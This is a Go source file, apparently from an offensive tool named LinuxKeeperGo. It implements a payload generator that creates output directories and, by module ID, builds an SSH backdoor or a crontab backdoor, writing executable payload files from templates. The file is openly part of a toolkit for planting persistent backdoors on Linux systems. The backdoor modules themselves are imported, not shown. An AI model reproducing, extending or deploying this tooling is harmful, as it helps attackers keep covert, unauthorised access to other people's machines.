package generator

import (
	"fmt"
	"os"
	"path/filepath"
	"text/template"
	"time"

	"github.com/10cks/LinuxKeeperGo/internal/modules"
	"github.com/10cks/LinuxKeeperGo/internal/modules/crontab"
	"github.com/10cks/LinuxKeeperGo/internal/modules/ssh"
)

type Generator struct {
	OutputDir string
	Timestamp string
}

func NewGenerator() *Generator {
	return &Generator{
		OutputDir: "payloads",
		Timestamp: time.Now().Format("20060102_150405"),
	}
}

func (g *Generator) Generate(moduleID int) error {
	module, exists := modules.AvailableModules[moduleID]
	if !exists {
		return fmt.Errorf("invalid module ID: %d", moduleID)
	}

	// 创建输出目录
	outDir := filepath.Join(g.OutputDir, fmt.Sprintf("%d_%s_%s", moduleID, module.Name, g.Timestamp))
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %v", err)
	}

	// 根据模块类型生成payload
	switch moduleID {
	case 1:
		backdoor, err := ssh.NewSSHBackdoor()
		if err != nil {
			return fmt.Errorf("failed to create SSH backdoor: %v", err)
		}
		return backdoor.GeneratePayload(outDir)
	case 2:
		return crontab.NewCrontabBackdoor().GeneratePayload(outDir)
	default:
		return fmt.Errorf("unsupported module ID: %d", moduleID)
	}
}

func (g *Generator) writeFile(filepath string, content string, data interface{}) error {
	tmpl, err := template.New("payload").Parse(content)
	if err != nil {
		return fmt.Errorf("failed to parse template: %v", err)
	}

	f, err := os.Create(filepath)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer f.Close()

	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("failed to execute template: %v", err)
	}

	return os.Chmod(filepath, 0755)
}
